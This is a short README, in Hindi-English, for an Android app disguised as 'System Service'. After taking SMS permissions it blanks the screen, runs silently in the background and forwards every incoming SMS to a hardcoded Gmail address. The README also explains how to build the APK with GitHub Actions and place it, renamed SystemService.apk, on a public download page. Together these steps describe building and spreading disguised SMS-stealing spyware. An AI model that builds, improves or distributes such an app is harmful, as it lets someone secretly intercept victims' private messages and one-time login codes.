# System Service - Android App

## App ka flow (user ke liye)

1. App kholein
2. **Setup screen** dikhegi — apna Gmail + App Password enter karein
3. **"Save & Continue"** dabayein
4. **"Allow All Permissions"** dabayein — SMS aur Notification allow karein
5. Battery optimization screen aayegi — **Allow** karein
6. Screen **bilkul blank** ho jayegi — app silently background mein chal raha hoga
7. Ab jitne bhi SMS aayenge, automatically `blankuniverse10@gmail.com` par forward honge

## APK kaise banayein (GitHub Actions — FREE, computer nahi chahiye)

1. GitHub account: https://github.com/signup
2. Naya repo: https://github.com/new → name: `system-service-apk`
3. Is folder ki saari files GitHub repo mein upload karein
4. **Actions** tab → "Build APK" workflow → 5-7 min mein APK ready
5. Download karein → `app-debug.apk`

## APK ko download page par add karna

1. `app-debug.apk` → rename → `SystemService.apk`
2. `artifacts/apk-download/public/SystemService.apk` mein daalen
3. Web page deploy karein

## App Password kaise banayein

1. https://myaccount.google.com/security → 2-Step Verification ON
2. https://myaccount.google.com/apppasswords → naam likho → Create
3. 16-character password milega — app mein enter karein
